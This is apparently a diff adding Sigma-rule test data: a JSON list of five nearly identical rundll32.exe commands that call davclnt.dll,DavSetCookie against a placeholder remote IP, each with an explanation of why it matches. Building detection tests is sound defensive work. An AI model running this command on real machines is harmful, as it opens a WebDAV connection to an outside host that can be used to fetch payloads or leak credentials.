@@ -1,0 +1,22 @@
+[
+  {
+    "output": "rundll32.exe C:\\windows\\system32\\davclnt.dll,DavSetCookie http://1.2.3.4",
+    "explanation": "This command matches the Sigma rule by using rundll32.exe to execute DavSetCookie from davclnt.dll with a non-local IP address."
+  },
+  {
+    "output": "rundll32.exe C:\\\\windows\\\\system32\\\\davclnt.dll,DavSetCookie http://1.2.3.4",
+    "explanation": "This command uses double backslashes for path normalization, which is a safe mutation technique and still matches the Sigma rule."
+  },
+  {
+    "output": "rundll32.exe C:\\windows\\system32\\davclnt.dll,DavSetCookie http://1.2.3.4",
+    "explanation": "This command uses standard path formatting and matches the Sigma rule without any mutation techniques."
+  },
+  {
+    "output": "rundll32.exe C:\\windows\\system32\\davclnt.dll,DavSetCookie http://1.2.3.4",
+    "explanation": "This command uses standard path formatting and matches the Sigma rule without any mutation techniques."
+  },
+  {
+    "output": "rundll32.exe C:\\windows\\system32\\davclnt.dll,DavSetCookie http://1.2.3.4",
+    "explanation": "This command uses standard path formatting and matches the Sigma rule without any mutation techniques."
+  }
+]
